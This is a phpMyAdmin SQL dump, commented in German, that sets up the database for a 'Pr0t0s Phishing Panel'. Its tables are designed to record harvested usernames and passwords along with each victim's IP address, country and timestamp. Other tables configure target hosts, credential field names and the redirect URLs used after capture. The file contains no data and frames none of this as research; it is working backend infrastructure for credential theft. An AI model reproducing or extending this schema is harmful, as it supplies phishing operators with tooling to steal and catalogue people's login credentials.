-- phpMyAdmin SQL Dump
-- version 3.3.9
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Server Version: 5.5.8
-- PHP-Version: 5.3.5

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Datenbank: `Pr0t0s Phishing Panel @ Hackbase.cc`
--

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `maintable`
--

CREATE TABLE IF NOT EXISTS `maintable` (
  `Index` int(11) NOT NULL AUTO_INCREMENT,
  `IPAdress` text CHARACTER SET latin1 NOT NULL,
  `Username` text CHARACTER SET latin1 NOT NULL,
  `Password` text COLLATE latin1_german1_ci NOT NULL,
  `Datum` text COLLATE latin1_german1_ci NOT NULL,
  `Zeit` text CHARACTER SET latin1 NOT NULL,
  `Country` text CHARACTER SET latin1 NOT NULL,
  `RemoteHost` text COLLATE latin1_german1_ci NOT NULL,
  PRIMARY KEY (`Index`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_german1_ci AUTO_INCREMENT=1 ;

--
-- Daten für Tabelle `maintable`
--


-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `phishing`
--

CREATE TABLE IF NOT EXISTS `phishing` (
  `Index` int(11) NOT NULL AUTO_INCREMENT,
  `HostName` text NOT NULL,
  `UsernameGetValue` text NOT NULL,
  `PasswordGetValue` text NOT NULL,
  `RedirectURL` text NOT NULL,
  `RequireMethode` text NOT NULL,
  PRIMARY KEY (`Index`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Daten für Tabelle `phishing`
--


-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `remotehosts`
--

CREATE TABLE IF NOT EXISTS `remotehosts` (
  `HostID` int(11) NOT NULL AUTO_INCREMENT,
  `HostName` text NOT NULL,
  `HostPicture` text NOT NULL,
  PRIMARY KEY (`HostID`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Daten für Tabelle `remotehosts`
--

